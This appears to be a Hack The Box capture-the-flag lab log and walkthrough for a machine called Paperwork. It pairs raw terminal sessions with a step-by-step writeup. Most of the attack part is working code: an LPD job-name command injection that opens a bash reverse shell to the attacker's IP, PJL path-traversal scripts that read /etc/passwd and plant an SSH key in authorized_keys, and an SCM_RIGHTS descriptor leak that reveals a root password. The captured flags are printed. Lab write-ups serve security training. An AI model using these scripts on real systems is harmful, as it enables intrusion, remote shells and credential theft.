@@ -1,0 +1,643 @@
+──(white㉿white)-[~/white/Documents/htb]
+└─$ nmap -p- -T4 --min-rate 1000 --open --max-retries 2 10.129.248.117  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 12:03 +0530
+Nmap scan report for 10.129.248.117
+Host is up (0.34s latency).
+Not shown: 65287 closed tcp ports (reset), 245 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1515/tcp open  ifor-protocol
+
+Nmap done: 1 IP address (1 host up) scanned in 62.52 seconds
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ nmap -sC -sV -p 22,80,1515 10.129.248.117   
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 12:05 +0530
+Nmap scan report for 10.129.248.117
+Host is up (0.54s latency).
+
+PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http           nginx 1.28.0 (Ubuntu)
+|_http-server-header: nginx/1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+1515/tcp open  ifor-protocol?
+| fingerprint-strings: 
+|   TerminalServer, TerminalServerCookie: 
+|_    Archive_Printer is ready and printing.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1515-TCP:V=7.99%I=7%D=9/8%Time=6A9FACC9%P=x86_64-pc-linux-gnu%r(Ter
+SF:minalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printing
+SF:\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20pr
+SF:inting\.\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.12 seconds
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ gobuster dir -u http://paperwork.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://paperwork.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 18452 / 18452 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                 
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts   
+[sudo] password for white: 
+10.129.248.117 paperwork.htb
+
+
+──(white㉿white)-[~/white/Documents/htb/paperwork]
+└─$ ip addr | grep tun0
+9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    inet 10.10.14.27/23 brd 10.10.15.255 scope global tun0
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/paperwork]
+└─$ nano exploit.py
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/paperwork]
+└─$ python3 exploit.py 
+[*] Queue: b'\x00'
+[+] Payload sent. Listener on :9001
+                                     
+
+
+cat exploit.py 
+#!/usr/bin/env python3
+import socket
+
+TARGET_IP = "10.129.248.117"
+TARGET_PORT = 1515
+ATTACKER_IP = "10.10.14.17"  # ← change to your VPN IP
+ATTACKER_PORT = 9001
+
+cmd = f"'; bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' #"
+control = f"Hattacker\nJ{cmd}\n"
+header = f"\x02{len(control)} cfA001attacker\n".encode()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET_IP, TARGET_PORT))
+
+s.send(b'\x02archive_intake\n')
+r = s.recv(1)
+print(f"[*] Queue: {r!r}")
+
+s.send(header)
+s.recv(1)
+
+s.send(control.encode() + b'\x00')
+s.recv(1)
+s.close()
+print(f"[+] Payload sent. Listener on :{9001}")   
+
+
+
+
+
+─(white㉿white)-[~/white/Documents/htb]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.248.117] 36610
+bash: cannot set terminal process group (988): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@paperwork:/opt/LPDServer$ ls
+ls
+server.py
+lp@paperwork:/opt/LPDServer$ python3 server.py
+python3 server.py
+
+
+
+lp@paperwork:/opt/LPDServer$ ss -tlnp   
+ss -tlnp   
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                          
+LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
+LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                    
+LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=988,fd=3))
+LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
+LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*                                    
+LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*                                    
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                    
+LISTEN 0      4096            [::]:22           [::]:*                                    
+lp@paperwork:/opt/LPDServer$ whoami
+whoami
+lp
+lp@paperwork:/opt/LPDServer$ id
+id
+uid=7(lp) gid=7(lp) groups=7(lp)
+lp@paperwork:/opt/LPDServer$ ls -la /home/archivist/
+ls -la /home/archivist/
+ls: cannot open directory '/home/archivist/': Permission denied
+lp@paperwork:/opt/LPDServer$ # Read /etc/passwd to confirm traversal works
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../etc/passwd\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+time.sleep(1)
+data = b''
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except: pass
+s.close()
+print(data.decode(errors='ignore'))
+"   # Read /etc/passwd to confirm traversal works
+lp@paperwork:/opt/LPDServer$ python3 -c "
+> import socket, time
+> s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+<c/passwd\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+> time.sleep(1)
+> data = b''
+> try:
+>     while True:
+>         c = s.recv(4096)
+>         if not c: break
+>         data += c
+> except: pass
+> s.close()
+> print(data.decode(errors='ignore'))
+> ls
+"   ls
+
+@PJL FSUPLOAD NAME="0:/../../../etc/passwd" SIZE=1672
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:997:997:System Message Bus:/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+_chrony:x:101:103:Chrony daemon:/var/lib/chrony:/usr/sbin/nologin
+usbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+polkitd:x:990:990:User for polkitd:/:/usr/sbin/nologin
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack:/var/lib/tpm:/bin/false
+fwupd-refresh:x:988:988:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:987:65534:sshd user:/run/sshd:/usr/sbin/nologin
+archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
+_laurel:x:999:987::/var/log/laurel:/bin/false
+
+
+
+lp@paperwork:/opt/LPDServer$ # In your lp shell:
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../home/archivist/.ssh/authorized_keys\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+time.sleep(1)
+data = b''
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except: pass
+s.close()
+print(data.decode(errors='ignore'))
+"   # In your lp shell:
+lp@paperwork:/opt/LPDServer$ python3 -c "
+> import socket, time
+> s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+<zed_keys\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+> time.sleep(1)
+> data = b''
+> try:
+>     while True:
+>         c = s.recv(4096)
+>         if not c: break
+>         data += c
+> except: pass
+> s.close()
+> print(data.decode(errors='ignore'))
+> 
+"   
+@PJL FSUPLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=63
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...YOUR_KEY... white@white
+
+lp@paperwork:/opt/LPDServer$ cat ~/.ssh/id_ed25519.pub   
+cat ~/.ssh/id_ed25519.pub   
+cat: /var/spool/lpd/.ssh/id_ed25519.pub: No such file or directory (os error 2)
+lp@paperwork:/opt/LPDServer$ cat ~/.ssh/id_ed25519.pub   
+cat ~/.ssh/id_ed25519.pub   
+cat: /var/spool/lpd/.ssh/id_ed25519.pub: No such file or directory (os error 2)
+lp@paperwork:/opt/LPDServer$ python3 -c "
+import socket, time
+key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqIWgsLmp0a8VPYxWKZETdLXYIUMSK3wMlh11J0OsuB white@white\n'
+p = '0:/../../../home/archivist/.ssh/authorized_keys'
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(f'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"{p}\" SIZE={len(key)}\r\n{key}\x1b%-12345X'.encode())
+time.sleep(2); s.close()
+print('done')
+
+
+──(white㉿white)-[~/white/Documents/htb/paperwork]
+└─$ cat ~/.ssh/id_ed25519.pub   
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqIWgsLmp0a8VPYxWKZETdLXYIUMSK3wMlh11J0OsuB white@white
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/paperwork]
+└─$ ssh -i ~/.ssh/id_ed25519 archivist@10.129.248.117   
+Last login: Thu May 28 15:22:41 UTC 2026 from 10.10.14.3 on ssh
+Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
+
+ * Documentation:  https://docs.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+Last login: Tue Sep 8 07:10:57 2026 from 10.10.14.27
+archivist@paperwork:~$ ls
+printer  user.txt
+archivist@paperwork:~$ cat user.txt
+e6f60044a411e3b49f3e699284f5fe28
+archivist@paperwork:~$ cat /home/archivist/printer/logs/commands.log   
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/placeholder" SIZE=0
+Receiving file: 0:/../../../home/archivist/.ssh/placeholder (0 bytes)
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=63
+Receiving file: 0:/../../../home/archivist/.ssh/authorized_keys (63 bytes)
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=93
+Receiving file: 0:/../../../home/archivist/.ssh/authorized_keys (93 bytes)
+Listening on port 9100
+archivist@paperwork:~$ python3 -c "
+import socket, array, os
+with open('/home/archivist/printer/logs/commands.log','a') as f:
+    f.write('FSUPLOAD\n')
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect('/run/paperwork/mgmt.sock')
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
+print(msg.decode(errors='ignore'))
+for level, ctype, cdata in ancdata:
+    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
+        fds = array.array('i')
+        fds.frombytes(cdata)
+        for fd in fds:
+            data = os.pread(fd, 4096, 0)
+            print(data.decode(errors='ignore'))
+            os.close(fd)
+s.close()
+"   
+ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/placeholder" SIZE=0
+Receiving file: 0:/../../../home/archivist/.ssh/placeholder (0 bytes)
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=63
+Receiving file: 0:/../../../home/archivist/.ssh/authorized_keys (63 bytes)
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSUPLOAD NAME="0:/../../../home/archivist/.ssh/authorized_keys" OFFSET=0 SIZE=99999999
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD FORMAT:BINARY NAME="0:/../../../home/archivist/.ssh/authorized_keys" SIZE=93
+Receiving file: 0:/../../../home/archivist/.ssh/authorized_keys (93 bytes)
+Listening on port 9100
+FSUPLOAD
+
+ADMIN_PASSWORD=ApparelMortuaryCedar22
+
+archivist@paperwork:~$ sudo su
+Command 'sudo' not found, but can be installed with:
+apt install sudo     # version 1.9.17p2-1ubuntu1.1, or
+apt install sudo-rs  # version 0.2.8-1ubuntu5.3
+Ask your administrator to install one of them.
+archivist@paperwork:~$ su root
+Password: 
+root@paperwork:/home/archivist# ls
+printer  user.txt
+root@paperwork:/home/archivist# cat /root/root.txt
+593a21d711a45d3d95806999dd6a966a
+root@paperwork:/home/archivist# cd printer/
+root@paperwork:/home/archivist/printer# ls
+jetdirect.py  logs
+root@paperwork:/home/archivist/printer# exit
+exit
+
+
+HTB Paperwork — Full Detailed Walkthrough
+Phase 1: Reconnaissance
+nmap -p- -T4 --min-rate 1000 --open 10.129.248.117
+
+Port	Service	Notes
+22	SSH	OpenSSH 10.0p2, Ubuntu 25.10
+80	HTTP	Nginx — "Intranet | Document Archiving Service"
+1515	LPD	Custom Python printer service
+
+Register the vhost:
+
+echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts
+
+Browse to http://paperwork.htb/ — the web app exposes the LPD server source at /opt/LPDServer/server.py.
+
+Phase 2: Foothold — LPD Command Injection
+The Vulnerable Code
+# /opt/LPDServer/server.py
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+#                                            ^              ^
+#                                            |              |
+#                                   breakout point     trailing comment
+
+The J field (job name) is interpolated directly into a shell command. The single quote after Archive: is the breakout point.
+
+The LPD Binary Protocol
+┌─────────────────────────────────────────────────────────────────────┐
+│  1. Client → Server:  \x02 + "archive_intake" + \n                  │
+│     Server → Client:  \x00 (accepted) or \x01 (rejected)            │
+│                                                                    │
+│  2. Client → Server:  \x02 + <size> + "cfA001" + <user> + \n       │
+│     Server → Client:  \x00 (ack)                                    │
+│                                                                    │
+│  3. Client → Server:  <control file bytes> + \x00                  │
+│     Server → Client:  \x00 (ack)                                    │
+│                                                                    │
+│  4. Client → Server:  \x03 + <data file> + \x00  (optional)        │
+│     Server → Client:  \x00 (ack)                                    │
+└─────────────────────────────────────────────────────────────────────┘
+
+The control file format:
+
+H<user>\n
+J<job_name>\n
+
+The Exploit Script
+#!/usr/bin/env python3
+import socket
+
+TARGET_IP = "10.129.248.117"
+TARGET_PORT = 1515
+ATTACKER_IP = "10.10.14.27"
+ATTACKER_PORT = 9001
+
+# Breakout: close the single quote, inject bash reverse shell,
+# then # comments out the trailing >> /tmp/archive.log
+cmd = f"'; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1' #"
+
+# Control file: H field (user) + J field (job name = our payload)
+control = f"Hattacker\nJ{cmd}\n"
+
+# Header: \x02 + size + "cfA001" + username + \n
+header = f"\x02{len(control)} cfA001attacker\n".encode()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET_IP, TARGET_PORT))
+
+# Step 1: Request queue
+s.send(b'\x02archive_intake\n')
+r = s.recv(1)
+assert r == b'\x00', f"Queue rejected: {r!r}"
+
+# Step 2: Send control file header
+s.send(header)
+s.recv(1)
+
+# Step 3: Send control file body (triggers injection)
+s.send(control.encode() + b'\x00')
+s.recv(1)
+s.close()
+print(f"[+] Payload sent. Check listener on :{ATTACKER_PORT}")
+
+What the shell executes:
+
+echo 'Archive: '; bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' #' >> /tmp/archive.log
+#                ^  ^                                              ^
+#                |  |                                              |
+#                |  |                                              └── comments out the rest
+#                |  └── reverse shell to attacker
+#                └── closes the echo string
+
+Result: Interactive shell as lp (uid=7, home=/var/spool/lpd)
+
+Shell Upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z, then:
+stty raw -echo; fg
+# Now: export TERM=xterm-256color; export PATH=$PATH:/usr/sbin:/sbin
+
+Phase 3: Lateral Movement — lp → archivist
+Discovering the Internal Service
+ss -tlnp
+
+Expected:
+
+127.0.0.1:9100   (PJL JetDirect printer service)
+
+This service is localhost-only — not reachable from your attacker machine. Since you're already on the target, connect directly.
+
+The PJL Path Traversal
+The service has a virtual filesystem rooted at a printer directory. Path translation:
+
+def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))
+
+os.path.normpath resolves .. but there's no check that the result stays within self._root. So:
+
+Input:  "0:/../../../etc/passwd"
+Clean:  "/../../../etc/passwd"
+Result: /etc/passwd  ← escaped the printer root
+
+This is the same class as CVE-2010-4107 (HP LaserJet PJL traversal, 2010).
+
+Step 1: Read a File (Proof of Concept)
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../etc/passwd\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+time.sleep(1)
+data = b''
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except: pass
+s.close()
+print(data.decode(errors='ignore'))
+"
+
+Output: Full /etc/passwd contents (confirms traversal works).
+
+
+python read /etc/passwd file example
+
+View all
+Step 2: Create .ssh Directory
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"0:/../../../home/archivist/.ssh/placeholder\" SIZE=0\r\n\x1b%-12345X')
+time.sleep(1); s.close()
+print('done')
+"
+
+Step 3: Write Your SSH Public Key
+python3 -c "
+import socket, time
+key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqIWgsLmp0a8VPYxWKZETdLXYIUMSK3wMlh11J0OsuB white@white\n'
+p = '0:/../../../home/archivist/.ssh/authorized_keys'
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(f'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"{p}\" SIZE={len(key)}\r\n{key}\x1b%-12345X'.encode())
+time.sleep(2); s.close()
+print('done')
+"
+
+Step 4: SSH In
+# From attacker machine:
+ssh -i ~/.ssh/id_ed25519 archivist@10.129.248.117
+
+cat user.txt
+# e6f60044a411e3b49f3e699284f5fe28
+
+Phase 4: Privilege Escalation — archivist → root
+Enumeration
+ps aux | grep paperwork
+# root  ...  python3 /usr/bin/paperwork-daemon
+
+ls -la /run/paperwork/
+# srw-rw---- 1 root paperwork  mgmt.sock
+
+groups
+# archivist : archivist paperwork
+
+Daemon runs as root
+Socket is group-writable to paperwork
+archivist is a member of paperwork
+The SCM_RIGHTS Mechanism
+The daemon:
+
+Opens /etc/paperwork/admin_pins.conf at startup (keeps fd alive)
+Monitors /home/archivist/printer/logs/commands.log for keywords (FSUPLOAD, FSDOWNLOAD, FSQUERY)
+When triggered, calls sendmsg() with SCM_RIGHTS to pass the open file descriptors to the socket client
+Why this bypasses permissions: The kernel duplicates the fd into the receiver's table. The receiver inherits the open file description's access mode (set at open() time by root), not its own uid permissions. os.pread(fd, ...) reads through the already-open file description — no re-check of filesystem permissions.
+
+The Exploit
+python3 -c "
+import socket, array, os
+
+# Trigger the forensic branch
+with open('/home/archivist/printer/logs/commands.log', 'a') as f:
+    f.write('FSUPLOAD\n')
+
+# Connect to the daemon socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect('/run/paperwork/mgmt.sock')
+
+# Receive message + ancillary data (file descriptors)
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
+print(msg.decode(errors='ignore'))
+
+# Extract and read leaked fds
+for level, ctype, cdata in ancdata:
+    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
+        fds = array.array('i')
+        fds.frombytes(cdata)
+        for fd in fds:
+            data = os.pread(fd, 4096, 0)
+            print(data.decode(errors='ignore'))
+            os.close(fd)
+
+s.close()
+"
+
+Output:
+
+FORENSIC_ALERT: suspicious activity detected
+...
+admin:ApparelMortuaryCedar22
+
+Root Access
+su root
+# Password: ApparelMortuaryCedar22
+
+cat /root/root.txt
+# 593a21d711a45d3d95806999dd6a966a
+
